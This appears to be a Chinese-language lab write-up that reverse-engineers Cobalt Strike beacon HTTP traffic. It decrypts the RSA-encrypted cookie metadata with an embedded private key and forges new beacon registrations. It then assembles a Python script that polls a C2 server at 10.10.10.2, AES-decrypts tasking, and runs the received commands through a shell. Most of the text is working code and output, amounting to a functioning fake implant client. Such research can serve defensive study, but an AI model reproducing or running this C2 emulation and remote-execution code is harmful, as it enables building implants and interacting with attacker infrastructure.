# beacon

![image-20231229203812464](assets/image-20231229203812464.png)

当beacon执行后，如果是http的监听器，会先访问/ca，随后就上线了



![image-20231229203959225](assets/image-20231229203959225.png)

首先是访问这个url，返回200和content类型



```
GET /ca HTTP/1.1
Accept: */*
Cookie: GMtKehpyPY7OW7ETVUBNo8M8SI9Vzw5vTjATUyjNvU/YVtCFQfp5/XVCxO9RCRkW03DdZZHTxABWQEnVEu1uu56XSfcThIsUKuWHR+ulFeW4kln+e5nDi0UOGoh4l/h2BJGk3Vu/7FchqF3eFFPiUt21zqAu7mw6a+D8wN+SQ98=
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)
Host: 10.10.10.2
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Sat, 30 Dec 2023 01:37:30 GMT
Content-Type: application/octet-stream
Content-Length: 0
```

假如我在发一个会怎么样？



```
import requests

url = 'http://10.10.10.2/ca'
headers = {
    'Accept': '*/*',
    'Cookie': 'GMtKehpyPY7OW7ETVUBNo8M8SI9Vzw5vTjATUyjNvU/YVtCFQfp5/XVCxO9RCRkW03DdZZHTxABWQEnVEu1uu56XSfcThIsUKuWHR+ulFeW4kln+e5nDi0UOGoh4L/h2BJGk3Vu/7FchqF3eFFPiUt21zqAu7mw6a+D8wN+SQ98=',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)',
    'Host': '10.10.10.2',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache'
}

response = requests.get(url, headers=headers)

if response.status_code == 200:
    print("请求成功，响应内容：")
    print(response.text)
else:
    print(f"请求失败，状态码：{response.status_code}")
```

发送之后毫无反应，这是为什么？



![image-20231229204737672](assets/image-20231229204737672.png)

cs服务端给了报错信息我们来看看他说什么

```
[-] Invalid session id
[-] A Malleable C2 attempt to recover data from a '.http-get.client.metadata' transaction failed. This could be due to a bug in the profile, a change made to the profile after this Beacon was run, or a change made to the transaction by some device between your target and your Cobalt Strike controller. The following information will (hopefully) help narrow down what happened.

From   '10.10.10.1'
URI    '/ca'

Headers
-------
'REMOTE_ADDRESS' = '/10.10.10.1'
'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
'Upgrade-Insecure-Requests' = '1'
'Connection' = 'keep-alive'
'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
'Host' = '10.10.10.2'
'Accept-Encoding' = 'gzip, deflate'
'Accept-Language' = 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6'

[-] Trapped javax.crypto.BadPaddingException during RSA decrypt [HTTP session handler]: Decryption error
javax.crypto.BadPaddingException: Decryption error
        at sun.security.rsa.RSAPadding.unpadV15(RSAPadding.java:369)
        at sun.security.rsa.RSAPadding.unpad(RSAPadding.java:282)
        at com.sun.crypto.provider.RSACipher.doFinal(RSACipher.java:372)
        at com.sun.crypto.provider.RSACipher.engineDoFinal(RSACipher.java:406)
        at javax.crypto.Cipher.doFinal(Cipher.java:2205)
        at dns.AsymmetricCrypto.decrypt(Unknown Source)
        at beacon.BeaconC2.process_beacon_metadata(Unknown Source)
        at beacon.BeaconHTTP$_A.serve(Unknown Source)
        at c2profile.MalleableHook.serve(Unknown Source)
        at cloudstrike.WebServer._serve(WebServer.java:344)
        at cloudstrike.WebServer.serve(WebServer.java:282)
        at cloudstrike.NanoHTTPD$HTTPSession.run(NanoHTTPD.java:372)
        at java.lang.Thread.run(Thread.java:833)
        at com.oracle.svm.core.thread.JavaThreads.threadStartRoutine(JavaThreads.java:597)
        at com.oracle.svm.core.posix.thread.PosixJavaThreads.pthreadStartRoutine(PosixJavaThreads.java:194)
[-] decrypt of metadata failed
[-] A Malleable C2 attempt to recover data from a '.http-get.client.metadata' transaction failed. This could be due to a bug in the profile, a change made to the profile after this Beacon was run, or a change made to the transaction by some device between your target and your Cobalt Strike controller. The following information will (hopefully) help narrow down what happened.
```

这个说的是无效的session id，假如我重启后能否重置这个session id呢？实践证明不太行，并且说了解密错误，我们在回去看看这个数据包



```
Cookie: GMtKehpyPY7OW7ETVUBNo8M8SI9Vzw5vTjATUyjNvU/YVtCFQfp5/XVCxO9RCRkW03DdZZHTxABWQEnVEu1uu56XSfcThIsUKuWHR+ulFeW4kln+e5nDi0UOGoh4l/h2BJGk3Vu/7FchqF3eFFPiUt21zqAu7mw6a+D8wN+SQ98=
```

发现这个cookie应该就是密文了，根据报错使用的应该是rsa算法，长得又很像base64



## 解密

参考的是这篇文章

>[# Cobalt Strike：使用已知的私钥解密流量-Part 2 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/327060.html)

这段cookie是base64编码后的rsa加密密文，可以使用私钥对其解密



```
python cs-decrypt-metadata.py -f cobaltstrike.beacon_keys GMtKehpyPY7OW7ETVUBNo8M8SI9Vzw5vTjATUyjNvU/YVtCFQfp5/XVCxO9RCRkW03DdZZHTxABWQEnVEu1uu56XSfcThIsUKuWHR+ulFeW4kln+e5nDi0UOGoh4l/h2BJGk3Vu/7FchqF3eFFPiUt21zqAu7mw6a+D8wN+SQ98=
```



![image-20231229210534035](assets/image-20231229210534035.png)

这样就解密出来的cookie的内容，尝试解密两个cookie看看



```
Header: 0000beef
Datasize: 00000056
Raw key:  65986f9dd1ba8cef8497cafe50045047
 aeskey:  bb0ba6cded0c53440731aaaaeda72db9
 hmackey: c489347d6cf532ce15f69615063b349e
charset: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
charset_oem: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
bid: 3f8d1c50 1066212432
pid: 1634 5684
port: 0
flags: 06
var1: 6
var2: 2
var3: 9200
var4: 32766
var5: 2892218784
var6: 2892205824
var7: 2177935552
Field: b'DESKTOP-SL1IJEU'
Field: b'wuya'
Field: b'beacon_x64.exe'
```



```
Header: 0000beef
Datasize: 00000056
Raw key:  e7cda4cc04910f0d3e8e3e6c1e6b0fe9
 aeskey:  d14bda6ed395c37e2634144806a66631
 hmackey: 12abd36f9d5aa216bce3b1b9a9efc6f6
charset: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
charset_oem: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
bid: 39a30542 966985026
pid: 124c 4684
port: 0
flags: 06
var1: 6
var2: 2
var3: 9200
var4: 32766
var5: 2892218784
var6: 2892205824
var7: 2177935552
Field: b'DESKTOP-SL1IJEU'
Field: b'wuya'
Field: b'beacon_x64.exe'
```

对比一下我们可以发现每次变化的是



```
Raw key
 aeskey
 hmackey
bid
pid
```

key应该是随机生成的，上面直接失败估计是因为bid重复了



## 构造数据包

尝试对着上面的解密数据，使用密钥来构造一个一样的cookie



```
import base64

base64_data = "VgPT//uZ64SFBtAndec7HDhaGKQg3VVfRsCLWiB7ebY3oDnO3dP7IvYYDuSMIlwAJbz1YYrlqqkGU4+k+lfAvxK2snd/i2iRfmDgWy5KkpFdlKIKsgaajo3fWq5xfnBVVdSRDOk8BHo7ajE9id8XgDWBD97Zn/jsm6vZm9kwS5U="

decoded_data = base64.b64decode(base64_data)

hex_representation = ''.join([f'\\x{byte:02x}' for byte in decoded_data])

print(f"Decoded data: {decoded_data}")
print(f"Hex representation: b'{hex_representation}'")

```

先看看密文长什么样子



```
b'\x56\x03\xd3\xff\xfb\x99\xeb\x84\x85\x06\xd0\x27\x75\xe7\x3b\x1c\x38\x5a\x18\xa4\x20\xdd\x55\x5f\x46\xc0\x8b\x5a\x20\x7b\x79\xb6\x37\xa0\x39\xce\xdd\xd3\xfb\x22\xf6\x18\x0e\xe4\x8c\x22\x5c\x00\x25\xbc\xf5\x61\x8a\xe5\xaa\xa9\x06\x53\x8f\xa4\xfa\x57\xc0\xbf\x12\xb6\xb2\x77\x7f\x8b\x68\x91\x7e\x60\xe0\x5b\x2e\x4a\x92\x91\x5d\x94\xa2\x0a\xb2\x06\x9a\x8e\x8d\xdf\x5a\xae\x71\x7e\x70\x55\x55\xd4\x91\x0c\xe9\x3c\x04\x7a\x3b\x6a\x31\x3d\x89\xdf\x17\x80\x35\x81\x0f\xde\xd9\x9f\xf8\xec\x9b\xab\xd9\x9b\xd9\x30\x4b\x95'
```

在使用key解密这段密文



```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

private_key_data = '''-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJyR0/8FeqobdylpTBx/zccW4Lzu
v4njucJCUjyyM+4VNbPVg01oz02d1TnKn/70IjXMe6p4G4qRYn55D0X/vosjSkUzxLJvxL9z1/FN
RqpqjpHZj/R2huEf4J6jQC7ru6pUmSaY3H/iENAp5mY382aM0QWRvOLFAENzfB6IdlXxAgMBAAEC
gYAGuTD7D7CZ8N5H+GUGCNk8wbK/M2O3ZUnGh3zYkdVTVbSwFyOxc0rBXoG8Z96KcWKI+7+IUepY
SGceXzx5PZ4739KPYhBF86H3s8H2iJ8ROXbFqjKllaIIdvyW9O4klcurbXkSNtHK1PkFz33XQWuG
Evh5HFXHWqwf7Q/F1p7E8QJBALnNA7d4h8AnsYiPrO+x9Y+gWVVG22M9KvMXCrgY/HrwKcMazAOd
9lWuuz+kA/Q+ZLw/S5xNL7iuO/jSdkTYESsCQQDXuYVDJrAgXWNEy7kjApRfHX9he5cMdh6Ptnr8
ag+eq3m1AJdov8O41shn+lmZYG4fFjcas+zO+tSw56pIFc9TAkBp9zv0aoB5nenJqa+GsOcM9/Wb
BiNfUOZq56xMXKu6bbhTtre+JFv2eAYBAMjkhqUrG6pCxV6/JFe9zEJ5dwUrAkEAucLFYEfGTnhc
bPdI2z7zaNxLvjPgpBhqxLIMQaNLBAUA7r4to0POVDKPrAnGce65pQdKODJLbwhLcnJrDVvKhQJB
ALf/HP+h26uSsYf/sHG+yQlCk6F3UEWOsdtRlCwyHc7Icf43bCuh/6dTcekBO+X5IUiKlA/GhPum
BLju5zNFDzc=
-----END PRIVATE KEY-----'''

private_key = RSA.import_key(private_key_data)

base64_data = "VgPT//uZ64SFBtAndec7HDhaGKQg3VVfRsCLWiB7ebY3oDnO3dP7IvYYDuSMIlwAJbz1YYrlqqkGU4+k+lfAvxK2snd/i2iRfmDgWy5KkpFdlKIKsgaajo3fWq5xfnBVVdSRDOk8BHo7ajE9id8XgDWBD97Zn/jsm6vZm9kwS5U="

encrypted_data = base64.b64decode(base64_data)

cipher_rsa = PKCS1_v1_5.new(private_key)
decrypted_data = cipher_rsa.decrypt(encrypted_data, None)

hex_representation = ''.join([f'\\x{byte:02x}' for byte in decrypted_data])

print(f"Decrypted data: {decrypted_data}")
print(f"Hex representation: b'{hex_representation}'")
```

```
\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03\x3f\x8d\x1c\x50\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00\x81\xd0\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65
```

这就是解密出来的数据



```
Header: 0000beef
Datasize: 00000056
Raw key:  65986f9dd1ba8cef8497cafe50045047
 aeskey:  bb0ba6cded0c53440731aaaaeda72db9
 hmackey: c489347d6cf532ce15f69615063b349e
charset: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
charset_oem: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
bid: 3f8d1c50 1066212432
pid: 1634 5684
port: 0
flags: 06
var1: 6
var2: 2
var3: 9200
var4: 32766
var5: 2892218784
var6: 2892205824
var7: 2177935552
Field: b'DESKTOP-SL1IJEU'
Field: b'wuya'
Field: b'beacon_x64.exe'
```



接下来一一对应上面解析出来每个字符的意义

```
Header: \x00\x00\xbe\xef
Datasize: \x00\x00\x00\x56
Raw key:  \x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47
 aeskey:  bb0ba6cded0c53440731aaaaeda72db9
 hmackey: c489347d6cf532ce15f69615063b349e
charset: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
charset_oem: 03a8 ANSI/OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)
\xa8\x03\xa8\x03
bid: \x3f\x8d\x1c\x50\x00\x00 1066212432
pid: \x16\x34\x00\x00 5684
port: 0
flags: \x06
var1: 6
var2: 2
var3: 9200
var4: 32766
var5: 2892218784
var6: 2892205824
var7: 2177935552
Field: b'DESKTOP-SL1IJEU'
Field: b'wuya'
Field: b'beacon_x64.exe'
```

发现有些对应不上，但是不影响我们构造一个类似的请求包

```
b'\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03\x3f\x8d\x1c\x50\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00\x81\xd0\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65'
```

bid是`\x3f\x8d\x1c\x50\x00\x00`



```
beaconid = 1066212432
bytes_representation = beaconid.to_bytes(4, 'big')

hex_representation = ''.join([f'\\x{byte:02x}' for byte in bytes_representation])

print(hex_representation)
```

这段代码将bid转为4字节的大端字节序列



接下来将bid修改为1066212411得到`\x3f\x8d\x1c\x3b`,然后替换进去构造明文

```
b'\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03\x3f\x8d\x1c\x3b\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00\x81\xd0\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65'
```



```
import rsa
import base64

key = '''-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJyR0/8FeqobdylpTBx/zccW4Lzu
v4njucJCUjyyM+4VNbPVg01oz02d1TnKn/70IjXMe6p4G4qRYn55D0X/vosjSkUzxLJvxL9z1/FN
RqpqjpHZj/R2huEf4J6jQC7ru6pUmSaY3H/iENAp5mY382aM0QWRvOLFAENzfB6IdlXxAgMBAAEC
gYAGuTD7D7CZ8N5H+GUGCNk8wbK/M2O3ZUnGh3zYkdVTVbSwFyOxc0rBXoG8Z96KcWKI+7+IUepY
SGceXzx5PZ4739KPYhBF86H3s8H2iJ8ROXbFqjKllaIIdvyW9O4klcurbXkSNtHK1PkFz33XQWuG
Evh5HFXHWqwf7Q/F1p7E8QJBALnNA7d4h8AnsYiPrO+x9Y+gWVVG22M9KvMXCrgY/HrwKcMazAOd
9lWuuz+kA/Q+ZLw/S5xNL7iuO/jSdkTYESsCQQDXuYVDJrAgXWNEy7kjApRfHX9he5cMdh6Ptnr8
ag+eq3m1AJdov8O41shn+lmZYG4fFjcas+zO+tSw56pIFc9TAkBp9zv0aoB5nenJqa+GsOcM9/Wb
BiNfUOZq56xMXKu6bbhTtre+JFv2eAYBAMjkhqUrG6pCxV6/JFe9zEJ5dwUrAkEAucLFYEfGTnhc
bPdI2z7zaNxLvjPgpBhqxLIMQaNLBAUA7r4to0POVDKPrAnGce65pQdKODJLbwhLcnJrDVvKhQJB
ALf/HP+h26uSsYf/sHG+yQlCk6F3UEWOsdtRlCwyHc7Icf43bCuh/6dTcekBO+X5IUiKlA/GhPum
BLju5zNFDzc=
-----END PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCckdP/BXqqG3cpaUwcf83HFuC87r+J47nCQlI8
sjPuFTWz1YNNaM9NndU5yp/+9CI1zHuqeBuKkWJ+eQ9F/76LI0pFM8Syb8S/c9fxTUaqao6R2Y/0
dobhH+Ceo0Au67uqVJkmmNx/4hDQKeZmN/NmjNEFkbzixQBDc3weiHZV8QIDAQAB
-----END PUBLIC KEY-----'''
pack=b'\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03\x3f\x8d\x1c\x3b\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00\x81\xd0\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65\x09'
pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(
    key
)
enpack = rsa.encrypt(pack, pubkey)
print(base64.b64encode(enpack).decode('utf-8'))
```



![image-20231229223219087](assets/image-20231229223219087.png)

这样子就成功上线了，不过没有没有pid和process，为什么？发现不能单纯的替换，还需要随机生成2个字符并替换掉\xA8\xC0前的两个值



![image-20231229230510253](assets/image-20231229230510253.png)

这样就成功了，接下来整合为一个脚本



```
import rsa
import base64
import random
import requests
import time
import urllib.request

key = '''-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJyR0/8FeqobdylpTBx/zccW4Lzu
v4njucJCUjyyM+4VNbPVg01oz02d1TnKn/70IjXMe6p4G4qRYn55D0X/vosjSkUzxLJvxL9z1/FN
RqpqjpHZj/R2huEf4J6jQC7ru6pUmSaY3H/iENAp5mY382aM0QWRvOLFAENzfB6IdlXxAgMBAAEC
gYAGuTD7D7CZ8N5H+GUGCNk8wbK/M2O3ZUnGh3zYkdVTVbSwFyOxc0rBXoG8Z96KcWKI+7+IUepY
SGceXzx5PZ4739KPYhBF86H3s8H2iJ8ROXbFqjKllaIIdvyW9O4klcurbXkSNtHK1PkFz33XQWuG
Evh5HFXHWqwf7Q/F1p7E8QJBALnNA7d4h8AnsYiPrO+x9Y+gWVVG22M9KvMXCrgY/HrwKcMazAOd
9lWuuz+kA/Q+ZLw/S5xNL7iuO/jSdkTYESsCQQDXuYVDJrAgXWNEy7kjApRfHX9he5cMdh6Ptnr8
ag+eq3m1AJdov8O41shn+lmZYG4fFjcas+zO+tSw56pIFc9TAkBp9zv0aoB5nenJqa+GsOcM9/Wb
BiNfUOZq56xMXKu6bbhTtre+JFv2eAYBAMjkhqUrG6pCxV6/JFe9zEJ5dwUrAkEAucLFYEfGTnhc
bPdI2z7zaNxLvjPgpBhqxLIMQaNLBAUA7r4to0POVDKPrAnGce65pQdKODJLbwhLcnJrDVvKhQJB
ALf/HP+h26uSsYf/sHG+yQlCk6F3UEWOsdtRlCwyHc7Icf43bCuh/6dTcekBO+X5IUiKlA/GhPum
BLju5zNFDzc=
-----END PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCckdP/BXqqG3cpaUwcf83HFuC87r+J47nCQlI8
sjPuFTWz1YNNaM9NndU5yp/+9CI1zHuqeBuKkWJ+eQ9F/76LI0pFM8Syb8S/c9fxTUaqao6R2Y/0
dobhH+Ceo0Au67uqVJkmmNx/4hDQKeZmN/NmjNEFkbzixQBDc3weiHZV8QIDAQAB
-----END PUBLIC KEY-----'''
beaconid=1066212462
pack=b'\x00\x00\xbe\xef\x00\x00\x00\x56\x65\x98\x6f\x9d\xd1\xba\x8c\xef\x84\x97\xca\xfe\x50\x04\x50\x47\xa8\x03\xa8\x03'+bytearray((beaconid).to_bytes(4, 'big'))+b'\x00\x00\x16\x34\x00\x00\x06\x06\x02\x23\xf0\x00\x00\x7f\xfe\xac\x63\xc1\xa0\xac\x63\x8f\x00'+bytearray(random.getrandbits(4) for _ in range(2))+b'\xa8\xc0\x44\x45\x53\x4b\x54\x4f\x50\x2d\x53\x4c\x31\x49\x4a\x45\x55\x09\x77\x75\x79\x61\x09\x62\x65\x61\x63\x6f\x6e\x5f\x78\x36\x34\x2e\x65\x78\x65\x09'


pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(
    key
)
enpack = rsa.encrypt(pack, pubkey)
print(base64.b64encode(enpack).decode('utf-8'))

url = 'http://10.10.10.2/ca'
headers = {
    'Accept': '*/*',
    'Cookie': base64.b64encode(enpack).decode('utf-8'),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; MAAU; NP08)',
    'Host': '10.10.10.2',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache'
}
while 1:
    time.sleep(10)
    request = urllib.request.Request(url, headers=headers)
    reponse = urllib.request.urlopen(request).read()
    if len(reponse)>1:
        print(base64.b64encode(reponse).decode("utf-8"))
```

这样就能模拟上线了



## 命令执行

![image-20231229211935084](assets/image-20231229211935084.png)

当执行命令时，会发现回复了响应了密文，这段密文对应的就是执行的命令



![image-20231229212621426](assets/image-20231229212621426.png)

这里就是命令回显提交了，这里都是密文



>[Beta/cs-parse-http-traffic.py at master · DidierStevens/Beta · GitHub](https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py)

从其中可以找到解密的代码



```
import binascii
import base64
import Crypto.Cipher.AES
import hashlib
import hmac

CS_FIXED_IV = b'abcdefghijklmnop'

class SimpleCrypto(object):
    def __init__(self, rawkey='', hmacaeskeys=''):
        if rawkey != '':
            sha256digest = hashlib.sha256(binascii.a2b_hex(rawkey)).digest()
            self.hmackey = sha256digest[16:]
            self.aeskey = sha256digest[:16]
        elif hmacaeskeys != '':
            self.hmackey, self.aeskey = [binascii.a2b_hex(key) for key in hmacaeskeys.split(':')]
        else:
            raise ValueError("Either rawkey or hmacaeskeys must be provided")

    def decrypt(self, data):
        encryptedData = data[:-16]
        hmacSignatureMessage = data[-16:]
        hmacSignatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:16]
        
        if hmacSignatureMessage != hmacSignatureCalculated:
            raise Exception('HMAC signature invalid')

        cypher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, CS_FIXED_IV)
        decryptedData = cypher.decrypt(encryptedData)
        return decryptedData

def decrypt_cobalt_strike_data(base64_encoded_data, rawkey='', hmacaeskeys=''):
    data = base64.b64decode(base64_encoded_data)
    
    crypto = SimpleCrypto(rawkey, hmacaeskeys)
    return crypto.decrypt(data)

a=decrypt_cobalt_strike_data('3zBVcr+oOuHG7xpZr7PxeNTOynR877T+w++XVxtkuy9+AR/qO6JzxAfMKPhJ2rmgtRYJ4wl6AmH6yDX514czTA==','65986f9dd1ba8cef8497cafe50045047','c489347d6cf532ce15f69615063b349e')
print(a)
```

把能用的代码扣出来，然后尝试解密



![image-20231229235143228](assets/image-20231229235143228.png)

就得到执要执行的命令了



![image-20231229235325192](assets/image-20231229235325192.png)

对比了一下，第一个是使用shell whoami，第二个使用的是run whoami，但是不太清楚哪些奇怪的hex是什么，但是！！我们直接截取就完了，截取从/C 到\x00的所有字符



```
def extract_substring(data):
    start_index = data.find(b"/C ") + len(b"/C ")
    end_index = data.find(b"\x00", start_index)

    if start_index != -1 and end_index != -1:
        result = data[start_index:end_index].decode('utf-8')
        return result
    else:
        return "Substring not found"
```

这样就能截取出来



![image-20231230000616425](assets/image-20231230000616425.png)

这样就能成功接收到输入的命令



![image-20231230001658844](assets/image-20231230001658844.png)

简单处理一下，就能执行命令了



## 命令回显

![image-20231230002041969](assets/image-20231230002041969.png)

提交回显时会传入Beaconid，密文长这样

```
00000040a82565ebb7590a3dc6dfd0b51de2643e039951dc4db054dccf700dd7000d4d5ca14350345a8ba8876b5e568954598b15edefe3063f6a48831318f5dd68e432e2
```

```
AAAAQKglZeu3WQo9xt/QtR3iZD4DmVHcTbBU3M9wDdcADU1coUNQNFqLqIdrXlaJVFmLFe3v4wY/akiDExj13WjkMuI=
```

没找到解析这段数据包的文章，我直接把别人的代码copy过来了



![image-20231230004340330](assets/image-20231230004340330.png)

copy过来也没有成功回显，能执行命令但是不能回显emmmm



# 源代码

```
import rsa
import base64
import random
import requests
import binascii
import time
import urllib.request
import Crypto.Cipher.AES
import hashlib
import hmac
import subprocess

CS_FIXED_IV = b'abcdefghijklmnop'

class SimpleCrypto(object):
    def __init__(self, rawkey='', hmacaeskeys=''):
        if rawkey != '':
            sha256digest = hashlib.sha256(binascii.a2b_hex(rawkey)).digest()
            self.hmackey = sha256digest[16:]
            self.aeskey = sha256digest[:16]
        elif hmacaeskeys != '':
            self.hmackey, self.aeskey = [binascii.a2b_hex(key) for key in hmacaeskeys.split(':')]
        else:
            raise ValueError("Either rawkey or hmacaeskeys must be provided")

    def decrypt(self, data):
        encryptedData = data[:-16]
        hmacSignatureMessage = data[-16:]
        hmacSignatureCalculated = hmac.new(self.hmackey, encryptedData, hashlib.sha256).digest()[:16]
        
        if hmacSignatureMessage != hmacSignatureCalculated:
            raise Exception('HMAC signature invalid')

        cypher = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, CS_FIXED_IV)
        decryptedData = cypher.decrypt(encryptedData)
        return decryptedData

def decrypt_cobalt_strike_data(base64_encoded_data, rawkey='', hmacaeskeys=''):
    data = base64.b64decode(base64_encoded_data)
    
    crypto = SimpleCrypto(rawkey, hmacaeskeys)
    return crypto.decrypt(data)

def extract_substring(data):
    start_index = data.find(b"/C ") + len(b"/C ")
    end_index = data.find(b"\x00", start_index)

    if start_index != -1 and end_index != -1:
        result = data[start_index:end_index].decode('utf-8')
        return result
    else:
        return "Substring not found"

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        return result.stdout.strip()
    else:
        return result.stderr.strip()


key = '''-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAJyR0/8FeqobdylpTBx/zccW4Lzu
v4njucJCUjyyM+4VNbPVg01oz02d1TnKn/70IjXMe6p4G4qRYn55D0X/vosjSkUzxLJvxL9z1/FN
RqpqjpHZj/R2huEf4J6jQC7ru6pUmSaY3H/iENAp5mY382aM0QWRvOLFAENzfB6IdlXxAgMBAAEC
gYAGuTD7D7CZ8N5H+GUGCNk8wbK/M2O3ZUnGh3zYkdVTVbSwFyOxc0rBXoG8Z96KcWKI+7+IUepY
SGceXzx5PZ4739KPYhBF86H3s8H2iJ8ROXbFqjKllaIIdvyW9O4klcurbXkSNtHK1PkFz33XQWuG
Evh5HFXHWqwf7Q/F1p7E8QJBALnNA7d4h8AnsYiPrO+x9Y+gWVVG22M9KvMXCrgY/HrwKcMazAOd
9lWuuz+kA/Q+ZLw/S5xNL7iuO/jSdkTYESsCQQDXuYVDJrAgXWNEy7kjApRfHX9he5cMdh6Ptnr8
ag+eq3m1AJdov8O41shn+lmZYG4fFjcas+zO+tSw56pIFc9TAkBp9zv0aoB5nenJqa+GsOcM9/Wb
BiNfUOZq56xMXKu6bbhTtre+JFv2eAYBAMjkhqUrG6pCxV6/JFe9zEJ5dwUrAkEAucLFYEfGTnhc
bPdI2z7zaNxLvjPgpBhqxLIMQaNLBAUA7r4to0POVDKPrAnGce65pQdKODJLbwhLcnJrDVvKhQJB
ALf/HP+h26uSsYf/sHG+yQlCk6F3UEWOsdtRlCwyHc7Icf43bCuh/6dTcekBO+X5IUiKlA/GhPum
BLju5zNFDzc=
-----END PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCckdP/BXqqG3cpaUwcf83HFuC87r+J47nCQlI8
sjPuFTWz1YNNaM9NndU5yp/+9CI1zHuqeBuKkWJ+eQ9F/76LI0pFM8Syb8S/c9fxTUaqao6R2Y/0
dobhH+Ceo0Au67uqVJkmmNx/4hDQKeZmN/NmjNEFkbzixQBDc3weiHZV8QIDAQAB
-----END PUBLIC KEY-----'''
beaconid=1066212462
